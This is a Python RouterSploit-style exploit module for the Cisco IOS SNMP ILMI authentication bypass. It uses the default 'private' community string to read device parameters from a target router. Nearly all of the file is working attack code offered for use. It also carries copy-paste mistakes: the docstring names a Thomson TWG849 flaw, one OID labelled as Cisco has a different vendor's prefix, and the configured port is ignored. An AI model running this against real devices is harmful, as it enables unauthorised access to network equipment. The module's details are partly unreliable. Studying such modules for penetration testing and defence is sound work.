from pysnmp.entity.rfc3413.oneliner import cmdgen
from routersploit import (
    exploits,
    print_success,
    print_error,
    print_status,
    print_table,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Thomson TWG849 information disclosure vulnerability.
    If the target is vulnerable, it allows read sensitive information.
    """
    __info__ = {
        'name': 'Cisco SNMP ILMI configure authentic bypass',
        'description': 'Module exploits Cisco IOS 11.x / 12.x information disclosure vulnerability\n'
                       'which allows to read sensitive information or change configure without\n'
                       'authentication.',
        'authors': [
            'Cisco System Inc.', 
        ],
        'references': [
            'https://www.securityfocus.com/bid/2427/info',
        ],
        'devices': [
            'Cisco IOS 12.0XV',
            'Cisco IOS 12.0XS',
            'Cisco IOS 12.0XR',
            'Cisco IOS 12.0XQ',
            'Cisco IOS 12.0XM',
            'Cisco IOS 12.0XL',
            'Cisco IOS 12.0XK',
            'Cisco IOS 12.0XJ',
            'Cisco IOS 12.0XI',
            'Cisco IOS 12.0XH',
            'Cisco IOS 12.0XG',
            'Cisco IOS 12.0XF',
            'Cisco IOS 12.0XE',
            'Cisco IOS 12.0XD',
            'Cisco IOS 12.0XC',
            'Cisco IOS 12.0XB',
            'Cisco IOS 12.0XA',
            'Cisco IOS 12.0WT',
            'Cisco IOS 12.0W5',
            'Cisco IOS 12.0T',
            'Cisco IOS 12.0SX',
            'Cisco IOS 12.0ST',
            'Cisco IOS 12.0SL',
            'Cisco IOS 12.0SC',
            'Cisco IOS 12.0S',
            'Cisco IOS 12.0DC',
            'Cisco IOS 12.0DB',
            'Cisco IOS 12.0DA',
            'Cisco IOS 12.0',
            'Cisco IOS 11.3WA4',
            'Cisco IOS 11.3T',
            'Cisco IOS 11.3NA',
            'Cisco IOS 11.3MA',
            'Cisco IOS 11.3DB',
            'Cisco IOS 11.3DA',
            'Cisco IOS 11.3AA',
            'Cisco IOS 11.3(2)XA',
            'Cisco IOS 11.3',
            'Cisco IOS 11.2WA3',
            'Cisco IOS 11.2SA',
            'Cisco IOS 11.2P',
            'Cisco IOS 11.2GS',
            'Cisco IOS 11.2BC',
            'Cisco IOS 11.2(9)XA',
            'Cisco IOS 11.2(4)XA',
            'Cisco IOS 11.1IA',
            'Cisco IOS 11.1CT',
            'Cisco IOS 11.1CC',
            'Cisco IOS 11.1CA',
            'Cisco IOS 11.1AA',
            'Cisco IOS 11.1',
            'Cisco IOS 11.0',
        ],
        'id': 'sf-2427',
    }

    target = exploits.Option('', 'Target IP address e.g. 192.168.1.1', validators=validators.address)
    snmp_port = exploits.Option(161, 'Target SNMP Service port', validators=validators.integer)

    oids = {  # make, model, software version
        "model": "1.3.6.1.2.1.1.1.0",
        "uptime": "1.3.6.1.2.1.1.3.0",
        # Cisco bbIfIlmiEnable
        "ILMIEnable": "1.3.6.1.4.1.2011.2.1.6.1.2.1.1.2",
    }

    def run(self):
        res = []

        cmdGen = cmdgen.CommandGenerator()
        print_status("Reading parameters...")
        for name in self.oids.keys():
            errorIndication, errorStatus, errorIndex, varBinds = cmdGen.getCmd(
                cmdgen.CommunityData("private"),
                cmdgen.UdpTransportTarget((self.target, 161)),
                self.oids[name],
            )

            if errorIndication or errorStatus:
                continue

            value = str(varBinds[0][1])
            res.append((name, value))

        if res:
            print_success("Exploit success")
            print_table(("Parameter", "Value"), *res)
        else:
            print_error("Exploit failed - could not read sensitive information")

    @mute
    def check(self):
        cmdGen = cmdgen.CommandGenerator()
        errorIndication, errorStatus, errorIndex, varBinds = cmdGen.getCmd(
            cmdgen.CommunityData("private"),
            cmdgen.UdpTransportTarget((self.target, 161)),
            '1.3.6.1.2.1.1.1.0',
        )

        if errorIndication or errorStatus:
            return False  # target is not vulnerable
        else:
            return True  # target is vulnerable
